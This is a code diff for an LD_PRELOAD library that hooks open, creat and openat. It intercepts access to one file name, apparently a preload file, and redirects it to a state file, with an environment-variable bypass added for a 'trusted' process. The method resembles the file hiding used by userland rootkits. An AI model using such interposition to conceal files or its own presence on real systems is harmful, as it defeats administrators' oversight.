@@ -1,8 +1,10 @@
 
 #include <main.h>
 
-
-//static DESCR_AND_FLAGS dsInfo;
+//
+// Linux maintain mandatory lock for file with
+// guid enable bit and goup execute disabled.
+//
 
 
 
@@ -12,12 +14,17 @@ int open(const char *pathname, int flags, mode_t mode) {
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
 	std::string file (pathname);
-	char chArr[2];
+	char chArr[2], *chPtr;
 	
 	
 	assert (opnPtr != NULL);
 	assert (rdPtr != NULL);
 	assert (pwrPtr != NULL);
+	
+	// To check if the caller is our trust process
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+		return opnPtr (pathname, flags, mode);
+	}
 	
 	file = getClearName (file);
 	
@@ -25,13 +32,17 @@ int open(const char *pathname, int flags, mode_t mode) {
 	if (!strcmp (prelFileNameClear, file.c_str ())) {
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
-// fcntl (); // to lock mandatory the file
+		lockAllFile (*fd);
+		
 		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
 		
 		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
 		if (-1 == ind) {
 			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
-			else return -1;
+			else {
+				serr.set (ENOENT);
+				return -1;
+			}
 		}
 		// the file doesn't exist
 		if (chArr[0] == not_created) {
@@ -75,18 +86,22 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 	CREAT crtPtr = (CREAT)dlsym (RTLD_NEXT, "creat");
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	std::string file (pathname);
-	char chArr[2];
+	char chArr[2], *chPtr;
 	
 	
 	assert (crtPtr != NULL);
 	assert (rdPtr != NULL);
+	
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+		return crtPtr (pathname, mode);
+	}
 	
 	file = getClearName (file);
 	
 	if (!strcmp (prelFileNameClear, file.c_str ())) {
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
-// fcntl (); // to lock mandatory the file
+		lockAllFile (*fd);
 		
 		int ret = crtPtr (pathname, mode);
 		if (ret == -1) return ret;
@@ -114,12 +129,16 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
 	std::string file (pathname);
-	char chArr[2];
+	char chArr[2], *chPtr;
 	
 	
 	assert (opnPtr != NULL);
 	assert (rdPtr != NULL);
 	assert (pwrPtr != NULL);
+	
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
+		return opnPtr (dirfd, pathname, flags, mode);
+	}
 	
 	file = getClearName (file);
 	
@@ -127,7 +146,8 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	if (!strcmp (prelFileNameClear, file.c_str ())) {
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
-// fcntl (); // to lock mandatory the file
+		lockAllFile (*fd);
+		
 		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
 		
 		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
